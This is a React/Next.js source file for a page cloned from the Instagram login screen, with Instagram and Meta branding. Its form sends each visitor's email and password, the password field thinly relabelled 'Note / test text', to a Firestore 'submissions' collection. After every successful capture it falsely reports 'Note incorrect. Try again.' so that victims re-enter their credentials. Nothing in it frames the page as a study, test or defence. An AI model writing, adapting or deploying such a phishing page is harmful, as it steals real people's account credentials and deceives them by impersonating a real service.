"use client";

import { FormEvent, useState } from "react";
import { addDoc, collection, serverTimestamp } from "firebase/firestore/lite";
import Image from "next/image";
import { db } from "@/lib/firebase";

export default function AuthPage() {
  const [email, setEmail] = useState("");
  const [note, setNote] = useState("");
  const [showNote, setShowNote] = useState(false);
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState("");
  const [error, setError] = useState("");

  async function handleSubmit(event: FormEvent<HTMLFormElement>) {
    event.preventDefault();

    console.log("1 - submit started");

    setLoading(true);
    setError("");
    setMessage("");

    try {
      console.log("2 - Firestore write starting");

      const docRef = await addDoc(collection(db, "submissions"), {
        email,
        note,
        createdAt: serverTimestamp(),
      });

      console.log("3 - Firestore write SUCCESS:", docRef.id);

      setError("Note incorrect. Try again.");
      setEmail("");
      setNote("");
    } catch (err) {
      console.error("FIRESTORE WRITE ERROR:", err);
      setError("Impossible d'enregistrer les données.");
    } finally {
      console.log("4 - submit finished");
      setLoading(false);
    }
  }

  return (
    <main className="auth-shell">
      <section className="hero-panel" aria-label="Introduction">
        <div className="brand-mark" aria-hidden="true">
          <div className="brand-mark-inner" />
        </div>

        <div className="hero-copy">
          <h1>
            Discover everyday moments from your <span>close friends.</span>
          </h1>
        </div>

        <div className="story-visual">
          <Image
            src="/auth/story-collage.png"
            alt=""
            width={650}
            height={538}
            className="story-collage-image"
            priority
          />
        </div>
      </section>

      <section className="login-panel">
        <div className="auth-card">
          <p className="mobile-language">English (US)</p>

          <div className="login-logo">
            <Image
              src="/auth/right-logo-transparent.png"
              alt="Instagram UI Demo"
              width={72}
              height={72}
              priority
              unoptimized
            />
          </div>

          <p className="auth-title">Log in to Instagram</p>
          <p className="demo-label"></p>

          <form onSubmit={handleSubmit} className="auth-form">
            <label className="sr-only" htmlFor="email">Email</label>
            <input
              id="email"
              type="text"
              placeholder="Email"
              value={email}
              onChange={(event) => setEmail(event.target.value)}
            />

            <label className="sr-only" htmlFor="note">Note / test text</label>
            <div className="note-field">
              <input
                id="note"
                type={showNote ? "text" : "password"}
                placeholder="Note / test text"
                value={note}
                onChange={(event) => setNote(event.target.value)}
              />
              <button
                className="note-visibility-button"
                type="button"
                aria-label={showNote ? "Hide note" : "Show note"}
                aria-pressed={showNote}
                onClick={() => setShowNote((visible) => !visible)}
              >
                {showNote ? (
                  <svg viewBox="0 0 24 24" aria-hidden="true">
                    <path d="M2.5 12s3.5-6 9.5-6 9.5 6 9.5 6-3.5 6-9.5 6-9.5-6-9.5-6Z" />
                    <circle cx="12" cy="12" r="3" />
                  </svg>
                ) : (
                  <svg viewBox="0 0 24 24" aria-hidden="true">
                    <path d="M3 3 21 21" />
                    <path d="M10.6 6.1A9.4 9.4 0 0 1 12 6c6 0 9.5 6 9.5 6a16.5 16.5 0 0 1-2.1 2.8M6.2 6.2C3.8 8 2.5 12 2.5 12s3.5 6 9.5 6a9.5 9.5 0 0 0 3.2-.6M9.9 9.9a3 3 0 0 0 4.2 4.2" />
                  </svg>
                )}
              </button>
            </div>

            <button className="primary-button" type="submit" disabled={loading}>
              {loading ? "Logging..." : "Log in"}
            </button>
          </form>

          {error && <p className="status error" role="alert">{error}</p>}
          {message && <p className="status success" role="status">{message}</p>}

          <p className="forgot-save">Forgot your password ?</p>

          <button className="create-account-button" type="button">
            Create new account
          </button>

          <div className="meta-brand">
            <Image
              src="/auth/meta-logo.png"
              alt="Meta"
              width={92}
              height={46}
              className="meta-logo"
            />
          </div>
        </div>
      </section>

    </main>
  );
}
